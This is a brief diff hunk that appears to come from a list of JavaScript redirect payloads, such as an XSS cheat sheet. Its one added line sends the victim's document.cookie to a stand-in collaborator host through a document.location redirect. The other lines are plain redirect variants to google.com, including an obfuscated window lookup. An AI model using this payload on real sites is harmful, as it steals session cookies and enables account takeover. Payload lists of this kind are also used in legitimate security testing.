@@ -39,6 +39,7 @@ window["doc"+"ument"]
 
 location="http://google.com"
 document.location = "http://google.com"
+document.location="https://COLLABORATOR.com?c="+document.cookie
 document.location.href="http://google.com"
 window.location.assign("http://google.com")
 window['location']['href']="http://google.com"
